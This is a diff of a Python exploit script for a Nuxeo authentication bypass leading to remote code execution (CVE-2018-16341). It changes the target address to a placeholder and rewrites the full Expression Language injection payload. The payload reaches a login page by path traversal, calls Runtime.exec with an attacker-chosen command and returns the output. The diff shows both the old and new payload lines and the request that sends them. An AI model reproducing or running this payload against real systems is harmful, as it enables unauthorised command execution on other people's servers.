@@ -13,7 +13,7 @@ print("\nNuxeo Authentication Bypass Remote Code Execution - CVE-2018-16341\n")
 proxy = {}
 
 # Remote target URL
-remote = "http://10.10.11.115"  # Update this to the actual target
+remote = "http://10.10.10.10"  # Update this to the actual target
 
 # Architecture setting (can be either "WIN" or "UNIX")
 ARCH = "WIN"
@@ -59,16 +59,7 @@ while True:
 
         # Step 3: Send the payload to execute the command
         print("[+] Executing command =>\n")
-        request1 = remote + (
-            '/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.io.BufferedReader")'
-            '.getDeclaredMethod("readLine").invoke("".getClass().forName("java.io.BufferedReader")'
-            '.getConstructor("".getClass().forName("java.io.Reader")).newInstance("".getClass()'
-            '.forName("java.io.InputStreamReader").getConstructor("".getClass().forName("java.io.InputStream"))'
-            '.newInstance("".getClass().forName("java.lang.Process").getDeclaredMethod("getInputStream").invoke('
-            '"".getClass().forName("java.lang.Runtime").getDeclaredMethod("exec","".getClass()).invoke('
-            '"".getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null),'
-            f"'{command}')))))))}.xhtml"
-        )
+        request1 = remote + '/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.io.BufferedReader").getDeclaredMethod("readLine").invoke("".getClass().forName("java.io.BufferedReader").getConstructor("".getClass().forName("java.io.Reader")).newInstance("".getClass().forName("java.io.InputStreamReader").getConstructor("".getClass().forName("java.io.InputStream")).newInstance("".getClass().forName("java.lang.Process").getDeclaredMethod("getInputStream").invoke("".getClass().forName("java.lang.Runtime").getDeclaredMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getDeclaredMethod("getRuntime").invoke(null),"' + command + '")))))}.xhtml'
 
         # Step 4: Execute the request and process the result
         r = requests.get(request1, proxies=proxy, verify=False, allow_redirects=False)
